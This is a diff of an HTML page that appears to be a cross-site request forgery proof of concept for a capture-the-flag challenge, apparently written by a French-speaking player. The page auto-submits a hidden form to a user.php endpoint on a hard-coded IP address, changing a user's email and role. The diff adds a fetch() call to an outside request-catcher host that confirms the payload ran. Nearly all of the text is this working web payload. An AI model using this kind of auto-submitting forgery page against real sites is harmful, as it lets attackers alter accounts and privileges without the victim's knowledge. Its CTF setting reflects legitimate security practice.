@@ -1,16 +1,22 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <form id="csrf" method="POST" action="http://51.44.165.35:49155/user.php">
+    <form id="f" method="POST" action="http://51.44.165.35:49159/user.php">
         <input type="hidden" name="id" value="19483756"/>
         <input type="hidden" name="lastname" value="Test"/>
         <input type="hidden" name="firstname" value="Test"/>
-        <input type="hidden" name="email" value="baba@ctf.fr"/>
-        <input type="hidden" name="role" value="admin"/>
+        <input type="hidden" name="email" value="admin@ctf.fr"/>
+        <input type="hidden" name="role" value="invite"/>
     </form>
 
     <script>
-        document.getElementById("csrf").submit();
+        // Ping de confirmation
+        fetch("https://pachour.requestcatcher.com/test", {
+            mode: "no-cors"
+        });
+
+        // Envoi du CSRF
+        document.getElementById("f").submit();
     </script>
 </body>
 </html>
